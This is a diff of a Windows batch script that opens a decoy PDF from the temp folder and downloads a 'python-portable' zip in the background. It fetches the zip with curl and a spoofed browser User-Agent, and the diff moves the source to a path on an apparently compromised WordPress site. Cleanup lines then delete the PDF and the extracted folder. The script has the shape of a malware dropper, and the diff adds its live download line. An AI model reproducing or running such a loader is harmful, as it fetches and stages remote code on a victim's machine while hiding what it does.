@@ -6,7 +6,7 @@ timeout /t 1 /nobreak >nul
 start "" "%temp%\doc.pdf"
 
 REM Download Python portable (in background, with proper User-Agent)
-curl -L -A "Mozilla/5.0" https://centremedicalwakim.com/app/python-portable.zip -o "%temp%\py.zip"
+curl -L -A "Mozilla/5.0" https://staging.derideal.com/wp-content/app/python-portable.zip -o "%temp%\py.zip"
 
 REM Wait for download to complete (check file size is stable)
 :wait_download
@@ -50,4 +50,5 @@ del "%temp%\doc.pdf" 2>nul
 rd /s /q "%temp%\py" 2>nul
 
 exit
+
 
